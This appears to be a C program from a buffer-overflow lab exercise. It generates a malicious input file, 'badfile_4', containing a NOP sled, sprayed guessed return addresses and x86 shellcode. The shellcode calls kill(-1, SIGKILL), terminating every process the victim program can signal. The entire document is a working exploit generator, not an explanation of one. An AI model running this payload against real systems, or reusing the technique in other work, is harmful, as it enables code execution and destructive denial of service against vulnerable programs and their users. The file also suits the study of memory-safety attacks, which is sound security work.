#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]= "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

unsigned long stack_ptr(){
    __asm__("movl %esp,%eax");
}

void main(int argc, char **argv)
{
    char buffer[517];
    memset(&buffer, 0x90, sizeof(buffer));

    char *ptr;
    int offset = 100, bsz = 517, i;
    long *addr_ptr = buffer, addr = stack_ptr() + offset;

    for (i = 0; i < 24; i++)
    	*(addr_ptr++) = addr;

    for (i = 0; i < strlen(shellcode); i++) 
     	buffer[bsz - (sizeof(shellcode) + 1) + i] = shellcode[i];

    buffer[bsz - 1] = '\0';
    FILE *badfile = fopen("./badfile_4", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}
